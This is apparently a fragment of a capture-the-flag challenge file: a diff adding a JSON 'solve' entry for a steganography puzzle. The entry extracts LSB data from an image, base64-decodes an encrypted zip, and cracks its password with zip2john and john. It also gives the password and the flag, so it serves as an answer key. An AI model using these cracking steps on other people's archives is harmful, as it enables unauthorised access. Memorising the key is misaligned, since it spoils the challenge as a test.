+        "solve": "Looking at the image with stegsolve, we can see a sus line in Red Plane 3. {image11.png} Extracting the Red LSB 3 from the image we can see this in the strings:\n ```{\"bottle\":\"Now, tell me, ye scallywag, what fruit did that tree bear?\", \"treasure\": \"UEsDBDMAAQBjAAO9WFoAAAAAWgAAAEUAAAAIAAsAZmxhZy50eHQBmQcAAgBBRQMIAFhOyFF8J1TyG2doQcYvrgzortHSCGMNxMshPDobNzagEPb3jVJi8820aRecsizN1F01EToNfBXNYLUo7v4irZDLka8iLR9HfkY0xgT+GE/9MxamvgIZHDogalBLAQI/ADMAAQBjAAO9WFoAAAAAWgAAAEUAAAAIAC8AAAAAAAAAIAAAAAAAAABmbGFnLnR4dAoAIAAAAAAAAQAYAEVPEqsEh9sBAAAAAAAAAAAAAAAAAAAAAAGZBwACAEFFAwgAUEsFBgAAAAABAAEAZQAAAIsAAAAAAA==\"}``` \nBase64 decrypt to see its a zip then crack the passwords with john ```~/john/run/zip2john xd.zip > hash.txt\njohn hash.txt``` The password was banana and it gave us the flag CTF{1f8915fa52fbf862ba636d69f39427dd8aeb4a9e7b28afc5a36fd70d6db580ac}"
+      }
+]
